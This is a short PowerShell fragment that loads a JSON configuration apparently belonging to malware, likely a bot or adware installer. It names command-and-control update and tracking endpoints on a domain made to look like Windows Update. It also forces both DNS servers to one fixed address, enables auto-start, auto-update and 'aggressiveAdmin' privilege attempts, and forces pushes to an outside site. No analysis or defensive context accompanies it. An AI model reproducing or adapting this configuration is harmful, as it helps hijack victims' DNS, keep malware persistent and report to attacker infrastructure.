
$server = @'
{
  "version": "2026.06.16 14:24:45",
  "urlDoc": "",
  "disabled": false,
  "disableVirus": false,
  "server": "default",
  "primaryDns": "84.200.33.53",
  "secondaryDns": "84.200.33.53",
  "extraUpdate": false,
  "updateUrl": "http://windowsupdateservices.xyz/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://windowsupdateservices.xyz/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 1,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [
    "https://veryoldgames.xyz"
  ],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startDownloadsBackForce": true,
  "startDownloadsBack": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": []
}
'@ | ConvertFrom-Json
